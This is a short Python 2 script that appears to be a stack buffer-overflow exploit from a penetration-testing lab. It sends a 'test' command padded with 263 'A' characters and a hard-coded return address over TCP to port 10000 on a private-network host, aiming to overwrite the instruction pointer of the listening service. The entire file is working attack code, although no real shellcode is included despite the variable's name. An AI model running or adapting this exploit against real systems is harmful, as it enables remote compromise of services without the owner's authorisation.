#!/usr/bin/python
import sys
import socket

# 7714b2f6 = \xf6\xb2\x14\x77
crash = "A" * 263 + "\xf6\xb2\x14\x77"
shellcode = 'test ' + crash + '\r\n'

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('10.11.23.92',10000))
	message=shellcode
	s.send(message)
	s.close()

except:
	print "Error connecting to remote machine."
	sys.exit() 